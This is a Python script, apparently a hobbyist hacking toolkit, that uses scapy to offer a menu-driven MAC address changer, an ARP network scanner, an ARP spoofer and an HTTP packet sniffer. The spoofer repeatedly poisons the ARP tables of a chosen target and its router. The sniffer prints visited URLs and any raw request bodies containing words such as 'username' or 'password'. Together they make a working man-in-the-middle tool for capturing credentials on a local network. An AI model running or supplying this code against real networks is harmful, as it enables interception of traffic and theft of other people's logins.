#!usr/bin/env python

import subprocess
import time
import scapy.all as scapy
from scapy.layers import http

inter = "eth0"
list_of_tools = ["1: MAC address Changer", "2: Network Scanner", "3: ARP Spoofer", "4: Packet Sniffer"]
print("Execute The program again if you want to use another tool within the program")
def tools():
    for tool in list_of_tools:
        print(tool)
    user_input = int(input("Select the tool you wish to use: "))
    return user_input

user_input = tools()

if user_input == 1:
    print("____________________________________________________________")
    print("Welcome to MAC address Changer")
    print("------------------------------------------------------------")
    interface = input("Enter Interface that needs change in mac address: ")
    new_mac = input("Enter Desired mac Address: ")
    def mac_change(interface, new_mac):
        print("[+] Changing " + interface + " Macaddress to " + new_mac)
        subprocess.call(["ifconfig", interface, "down"])
        subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
        subprocess.call(["ifconfig", interface, "up"])
    mac_change(interface, new_mac)
    print("Execute The program again if you want to use another tool within the program")
    exit()


elif user_input == 2:
    print("____________________________________________________________")
    print("Welcome to network scanner")
    print("------------------------------------------------------------")



    def scan_network(ip):
        request = scapy.ARP(pdst=ip)
        sending = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # print(request.summary())
        # This is used to list the values that can be set in the function
        # scapy.ls(scapy.ARP())
        # print(sending.summary())
        request_sending = sending / request
        # print(request_sending.summary())
        answer = scapy.srp(request_sending, timeout=1)[0]
        # print(answer.summary())
        print("IP\t\t\tMAC Address\n")
        for x in answer:
            print(x[1].psrc + "\t\t" + x[1].hwsrc + '\n')



    scan_network("10.0.2.1/24")
    print("Execute The program again if you want to use another tool within the program")
    exit()

elif user_input == 3:
    print("____________________________________________________________")
    print("Welcome to ARP spoofer")
    print("------------------------------------------------------------")



    def get_mac(ip):
        request = scapy.ARP(pdst=ip)
        sending = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        request_sending = sending / request
        answer = scapy.srp(request_sending, timeout=1, verbose=False)[0]
        return answer[0][1].hwsrc

    def spoof(target_ip, spoof):
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof)
        scapy.send(packet, verbose=False)

    x = str(input("Enter Target machine ip address: "))
    y = str(input("Enter router ip address: "))


    def restore(destination_ip, source_ip):
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)


    total_packets = 0
    try:
        while True:
            spoof(str(x), str(y))
            spoof(str(y), str(x))
            total_packets += 2
            print("\rPackets sent: " + str(total_packets), end=" ", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nDetected Keyboard Interrupt\nExiting")
        restore(str(x), str(y))
        restore(str(y), str(x))
        print("\nARP table restored successfully\n")


elif user_input == 4:
    print("____________________________________________________________")
    print("Welcome to Packet Sniffer")
    print("------------------------------------------------------------")


    def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=sniffed_packet)


    def url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


    def sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url_line = url(packet)
            print(str(url_line))
            login = get_login(packet)
            if login:
                print(login)


    def get_login(packet):
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keys = ['username', 'user', 'login', 'pass', 'password']
                for x in keys:
                    if x in str(load):
                        return load


    sniff(inter)

else:
    print("____________________________________________________________")
    print("Selection out of bounds")
    print("------------------------------------------------------------")
